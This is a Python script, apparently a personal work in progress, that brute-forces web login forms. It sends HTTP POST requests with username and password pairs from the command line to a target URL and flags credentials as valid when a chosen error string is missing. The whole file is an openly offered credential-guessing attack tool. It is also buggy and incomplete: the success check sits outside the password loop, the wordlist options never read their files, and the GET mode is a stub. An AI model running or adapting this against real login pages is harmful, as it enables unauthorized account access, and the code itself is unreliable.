import argparse
import requests
import sys
import string

parser = argparse.ArgumentParser(description = "I developed this tool for bruteforcing...")
parser.add_argument('-e', '--error_message', help="Message if I used invalid credentials", required=True)
parser.add_argument('-i', '--ip', help="URL for bruteforcing", required=True, type=str)
parser.add_argument('-k', '--keys', help="Keys (for example, username,password) from source code", required=True)
parser.add_argument('-m', '--method', help="Set method gor attack", required=True)
parser.add_argument('-p', '--password', help="Password for authentication", type=str)
parser.add_argument('-P', '--passwords', help="List with passwords for attack")
parser.add_argument('-t', '--threads', help="Enter count threads for bruteforcing", default=1)
parser.add_argument('-u', '--username', help="Username for authentication", type=str)
parser.add_argument('-U', '--usernames', help="List with usernames for attack")
args = parser.parse_args()

# Добавить обработку потоков, считывание данных из файла для опций -U , -P, http_get метод

# Набросок для по шаблонам
'''
passwords = []
for i in range(1000):
    password = str(i).zfill(3)
    for letter in string.ascii_uppercase:
        passwords.append(password + letter)
'''

def init_data():
    URL = args.ip
    method = args.method
    threads = args.threads
    keys = args.keys.split(",")
    error = args.error_message

    if args.username == None and args.usernames != None:
        usernames = args.usernames
    elif args.username != None and args.usernames == None:
        usernames = [args.username]
    elif args.username != None and args.usernames != None:
        print ("[*] You want to use -u and -U options both.You need to choose: username (-u option) of file with usernames (-U option).")
        sys.exit()
    else:
        print ("[*] You need to specify -u or -U option.")
        sys.exit()

    if args.password == None and args.passwords != None:
        passwords = args.passwords
    elif args.password != None and args.passwords == None:
        passwords = [args.password]
    elif args.password != None and args.passwords != None:
        print ("[*] You want to use -p and -P options both.You need to choose: password (-p option) of file with passwords (-P option).")
        sys.exit()
    else:
        print ("[*] You need to specify -p or -P option.")
        sys.exit()

    return URL, method, threads, keys, error, usernames, passwords

def http_post_brute(usernames, passwords, URL, keys, threads, error):
    for username in usernames:
        for password in passwords:
            data = {keys[0]:username, keys[1]:password}
            response = requests.post(URL, data=data)

        if error not in response.text:
            print (f'[+] Found valid credentials: {username}:{password}')
            break
        else:
            print (f'[*] Attempted: {username}:{password}')
    

def http_get_brute(usernames, passwords, URL, keys, threads, error):
    for password in passwords:
        pass

def start_scan(URL, method, threads, usernames, passwords):
    if args.method == 'http_post':
        http_post_brute(usernames, passwords, URL, keys, threads, error) 
    elif args.method == 'http_get':
        http_get_brute(usernames, passwords, URL, keys, threads, error)
    else:
        pass

if __name__ == "__main__":
    URL, method, threads, keys, error, usernames, passwords = init_data()
    start_scan(URL, method, threads, usernames, passwords)